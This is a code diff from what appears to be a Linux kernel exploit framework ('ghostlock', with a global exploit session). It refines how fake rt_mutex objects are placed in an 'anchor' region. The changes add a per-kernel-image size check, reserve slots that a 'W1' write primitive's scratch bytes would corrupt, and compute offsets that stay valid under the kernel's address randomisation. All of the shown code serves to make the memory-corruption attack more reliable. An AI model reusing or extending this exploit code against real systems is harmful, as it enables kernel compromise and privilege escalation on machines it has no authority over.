@@ -85,6 +85,18 @@ namespace ghostlock::route::anchor {
             const uintptr_t bytes = bytes_key
                                         ? static_cast<uintptr_t>(*bytes_key)
                                         : kLockAnchorBytesDefault;
+            /* Stage 3: a per-image sizeof(rt_mutex) is the real lower bound.
+             * The compiled 0x20 is the 5.10 shape; a profile that states a
+             * larger object must not be walked at the old pitch. */
+            if (const auto rt_mutex_size =
+                        session::g_exploit_session.profile.rt_mutex_size();
+                rt_mutex_size && stride < *rt_mutex_size) {
+                pr_error("[route] anchor stride 0x%llx is smaller than the profile's "
+                         "sizeof(rt_mutex) 0x%x; slots would overlap\n",
+                         static_cast<unsigned long long>(stride),
+                         static_cast<unsigned>(*rt_mutex_size));
+                return false;
+            }
             if (stride < kLockAnchorStrideMin || bytes == 0 || bytes % stride != 0) {
                 pr_error("[route] anchor geometry unusable (bytes=0x%llx stride=0x%llx): bytes must be a "
                          "non-zero multiple of the stride, and the stride at least 0x%llx -- the fake "
@@ -290,27 +302,40 @@ namespace ghostlock::route::anchor {
                 }
             }
 
-            if (next >= geom.slots) return geom.slots;
-            if (next >= reserved) {
-                /* First call in this process, or the chunk is spent: persist the end
-                 * of the next chunk BEFORE handing out any slot from it. A failed
-                 * write leaves `reserved` where it was, so the next attempt retries
-                 * rather than handing out an unrecorded slot. */
-                uintptr_t want = next + kLockAnchorChunk;
-                if (want > geom.slots) want = geom.slots;
-                if (!write_anchor_state(state_path, boot_id, want, geom.slots)) {
-                    pr_error("[route] cannot record the anchor slot reservation in %s; refusing to "
-                             "hand out a slot a later process would be given again\n",
-                             state_path.c_str());
-                    return geom.slots;
+            for (;;) {
+                if (next >= geom.slots) return geom.slots;
+                if (next >= reserved) {
+                    /* First call in this process, or the chunk is spent: persist the end
+                     * of the next chunk BEFORE handing out any slot from it. A failed
+                     * write leaves `reserved` where it was, so the next attempt retries
+                     * rather than handing out an unrecorded slot. */
+                    uintptr_t want = next + kLockAnchorChunk;
+                    if (want > geom.slots) want = geom.slots;
+                    if (!write_anchor_state(state_path, boot_id, want, geom.slots)) {
+                        pr_error("[route] cannot record the anchor slot reservation in %s; refusing to "
+                                 "hand out a slot a later process would be given again\n",
+                                 state_path.c_str());
+                        return geom.slots;
+                    }
+                    reserved = want;
+                    pr_info("[route] anchor slots: reserved %llu..%llu of %llu\n",
+                            static_cast<unsigned long long>(next),
+                            static_cast<unsigned long long>(reserved - 1),
+                            static_cast<unsigned long long>(geom.slots));
                 }
-                reserved = want;
-                pr_info("[route] anchor slots: reserved %llu..%llu of %llu\n",
-                        static_cast<unsigned long long>(next),
-                        static_cast<unsigned long long>(reserved - 1),
-                        static_cast<unsigned long long>(geom.slots));
+                const uintptr_t slot = next++;
+                if (geom.has_reserved && slot >= geom.reserved_first &&
+                    slot <= geom.reserved_last) {
+                    /* Page-free Stage 1: this slot carries W1's scratch
+                     * collateral, which the W1 write itself dirties. It must
+                     * never be handed out as a lock in this boot. */
+                    pr_info("[route] anchor slot %llu is reserved for the W1 scratch; "
+                            "skipping\n",
+                            static_cast<unsigned long long>(slot));
+                    continue;
+                }
+                return slot;
             }
-            return next++;
         }
     } // namespace
 
@@ -322,6 +347,35 @@ namespace ghostlock::route::anchor {
         *slot_out = 0;
         Geometry geom = {};
         if (!geometry_from(bytes, stride, &geom)) return 0;
+        /* Page-free Stage 1: reserve the slot(s) W1's scratch collateral
+         * touches. The scratch is stated as an image offset; the value written
+         * is alias(scratch) + 0x100, and the 0x18-byte window around it is what
+         * the erase reads/writes. Both are offset-space quantities, so the
+         * region-relative window does not depend on the runtime slide. */
+        const std::optional<uint64_t> scratch =
+                session::g_exploit_session.profile.w1_scratch_image();
+        if (scratch.has_value() && *scratch >= image &&
+            *scratch < image + static_cast<uint64_t>(geom.bytes)) {
+            const uint64_t window = (*scratch - image) + 0x100;
+            if (window + 0x18 > geom.bytes) {
+                pr_error("[route] W1 scratch +0x%llx leaves the anchor region "
+                         "(window 0x%llx+0x18 > 0x%llx); refusing the route\n",
+                         static_cast<unsigned long long>(*scratch),
+                         static_cast<unsigned long long>(window),
+                         static_cast<unsigned long long>(geom.bytes));
+                return 0;
+            }
+            geom.has_reserved = true;
+            geom.reserved_first = static_cast<uintptr_t>(window / geom.stride);
+            geom.reserved_last =
+                    static_cast<uintptr_t>((window + 0x17) / geom.stride);
+            pr_info("[route] W1 scratch +0x%llx reserves anchor slots %llu..%llu "
+                    "(window +0x%llx)\n",
+                    static_cast<unsigned long long>(*scratch),
+                    static_cast<unsigned long long>(geom.reserved_first),
+                    static_cast<unsigned long long>(geom.reserved_last),
+                    static_cast<unsigned long long>(window));
+        }
         const uintptr_t slot = allocate_slot(geom);
         *slot_out = slot;
         if (slot >= geom.slots) {
